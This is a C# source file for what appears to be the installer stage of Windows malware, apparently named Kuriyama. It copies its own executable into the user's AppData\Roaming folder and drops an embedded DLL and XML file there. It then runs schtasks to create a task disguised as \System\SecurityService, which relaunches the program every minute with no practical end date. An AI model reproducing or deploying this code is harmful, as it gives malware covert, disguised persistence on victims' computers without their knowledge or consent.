using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Kuriyama.install
{
    class Installer
    {
        system.SystemWorker sys = new system.SystemWorker();
        files.FileWorker dir = new files.FileWorker();
        string currFilename = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\')[System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
        public Installer()
        {

        }

        public void Run()
        {
            Move();
            CreateDll(Properties.Resources.CsQuery, dir.SysDirectory("AppData") + "\\CsQuery.dll");
            string array = Properties.Resources.CsQuery1;
            using (System.IO.StreamWriter file =
            new System.IO.StreamWriter(dir.SysDirectory("AppData") + "\\CsQuery.xml"))
            {
               
                file.Write(array);
                
            }
            addToStartup();
        }

        private void addToStartup()
        {
            
            sys.cmd("schtasks /create /tn \\System\\SecurityService /tr %userprofile%\\AppData\\Roaming\\" + currFilename + " /st 00:00 /du 9999:59 /sc daily /ri 1 /f");
        }

        private void Move()
        {
            sys.cmd("move " + currFilename + " " + dir.SysDirectory("AppData") + "\\" + currFilename);
        }

        private void CreateDll(byte[] byteArray, string path)
        {
            
            using (FileStream
                fileStream = new FileStream(path, FileMode.Create))
            {
               
                for (int i = 0; i < byteArray.Length; i++)
                {
                    fileStream.WriteByte(byteArray[i]);
                }

                
                fileStream.Seek(0, SeekOrigin.Begin);

               
                for (int i = 0; i < fileStream.Length; i++)
                {
                    if (byteArray[i] != fileStream.ReadByte())
                    {
                       
                        return;
                    }
                }
               
            }
        }
    }
}
